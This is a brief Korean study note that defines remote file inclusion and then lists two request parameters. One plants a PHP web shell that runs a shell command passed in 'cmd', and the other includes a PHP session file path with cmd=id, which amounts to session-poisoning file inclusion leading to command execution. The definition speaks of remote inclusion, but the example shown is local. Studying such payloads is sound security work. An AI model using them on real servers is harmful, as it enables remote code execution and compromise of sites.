# 개념
원격 파일 포함 취약점
웹 애플리케이션에서 외부 웹 서버에 있는 악의적인 파일을 포함시킬 수 있는 경우 발생



`p=<?php echo system($_GET['cmd']); ?>`

`p=/var/lib/php/sessions/687b635d46cfd929e6384b922cf50e4b&cmd=id`